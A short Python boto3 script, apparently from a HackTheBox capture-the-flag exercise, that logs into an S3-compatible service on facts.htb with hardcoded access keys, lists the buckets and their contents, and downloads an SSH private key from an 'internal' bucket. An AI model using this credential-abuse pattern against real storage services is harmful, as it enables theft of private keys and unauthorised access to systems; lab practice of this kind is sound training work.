import boto3
s3 = boto3.client(
    "s3",
    endpoint_url="http://facts.htb:54321",
    aws_access_key_id="AKIAA84AF26348EAC6E2",
    aws_secret_access_key="Gst4YbWVySiZLRTjECNRa/yzd0MYb/GcHu1YAIGL",
    region_name="us-east-1",
)
  # List all buckets
print("Buckets:", [b["Name"] for b in s3.list_buckets()["Buckets"]])
  # List objects in internal bucket
resp = s3.list_objects_v2(Bucket="internal")
for obj in resp.get("Contents", []):
    print(obj["Key"])
  # Download SSH private key
s3.download_file("internal", ".ssh/id_ed25519", "id_ed25519")
print("Downloaded id_ed25519")
